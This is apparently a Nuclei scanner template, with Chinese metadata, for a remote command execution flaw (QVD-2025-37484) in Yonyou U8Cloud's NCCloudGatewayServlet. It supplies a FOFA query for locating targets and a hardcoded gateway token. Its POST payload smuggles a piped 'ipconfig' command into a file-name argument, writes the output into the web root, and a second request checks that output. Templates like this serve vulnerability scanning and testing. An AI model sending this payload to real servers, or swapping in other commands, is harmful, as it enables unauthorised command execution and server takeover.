id: yongyouU8-Cloud-NCCloudGatewayServlet-RCE-QVD-2025-37484

info:
  name: 用友U8Cloud NCCloudGatewayServlet 命令执行漏洞(QVD-2025-37484)
  author: Superhero
  severity: high
  description: |-
    fofa: title=="U8C"
    用友U8Cloud NCCloudGatewayServlet 存在远程命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。
  reference:
    - https://mp.weixin.qq.com/s/oQETumjS1PT3Rp8nV5Io0A
  tags: RCE

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
  
http:
  - raw:
      - |
        POST /service/NCCloudGatewayServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
        Content-Type: application/json
        gatewaytoken:TJ6RT-3FVCB-DPYP8-XF7QM-96FV3

        {
          "serviceInfo": {
            "serviceClassName": "com.ufida.zior.console.IActionInvokeService",
            "serviceMethodName": "exec",
            "serviceMethodArgInfo": [
              {
                "agg": false,
                "isArray": false,
                "isPrimitive": true,
                "argType": { "body": "java.lang.String" },
                "argValue": { "body": "nc.bs.pub.util.ProcessFileUtils" }
              },
              {
                "agg": false,
                "isArray": false,
                "isPrimitive": true,
                "argType": { "body": "java.lang.String" },
                "argValue": { "body": "openFile" }
              },
              {
                "agg": false,
                "isArray": false,
                "isPrimitive": false,
                "argType": { "body": "java.lang.String" },
                "argValue": {
                  "body": "{{username}}.txt \"|ipconfig >webapps\\u8c_web\\{{username}}.txt\""
                }
              }
            ]
          }
        }
  - raw:
      - |
        GET /{{username}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Windows IP'
      - type: status
        status: 
          - 200